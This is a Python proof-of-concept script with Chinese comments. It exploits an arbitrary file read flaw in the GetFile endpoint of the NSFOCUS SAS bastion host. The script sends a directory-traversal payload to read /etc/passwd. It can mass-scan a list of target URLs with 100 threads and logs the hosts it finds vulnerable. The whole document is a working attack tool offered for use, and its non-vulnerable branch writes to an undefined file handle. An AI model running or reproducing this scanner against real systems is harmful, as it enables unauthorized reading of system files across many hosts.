
#导包
import requests,re,json,argparse,sys
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """ 
          _____      _   ______ _ _      
  / ____|    | | |  ____(_) |     
 | |  __  ___| |_| |__   _| | ___ 
 | | |_ |/ _ \ __|  __| | | |/ _ \
 | |__| |  __/ |_| |    | | |  __/
  \_____|\___|\__|_|    |_|_|\___|
                                  
                                  
        
"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="绿盟 SAS堡垒机 GetFile 任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/webconf/GetFile/index?path=../../../../../../../../../../../../../../../../../../etc/passwd'
    headers = {
        'User-Agent':'Mozilla/4.0(compatible;MSIE8.0;Windows NT 6.1)'
            }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=target + payload,verify=False,headers=headers,proxies=proxies)
        #print(res.status_code)
        #print(res.text)
        if ':0:0:' in res.text:
            with open('result1.txt','a',encoding='utf -8') as f:
                f.write(f'[+]{target}存在漏洞 \n')
                print(f'[+]{target}存在漏洞 \n')
        else:
            f.write(f'[-]{target}不存在漏洞 \n')
    except:
        pass
    
    
#函数入口
if __name__ == '__main__':
    main()
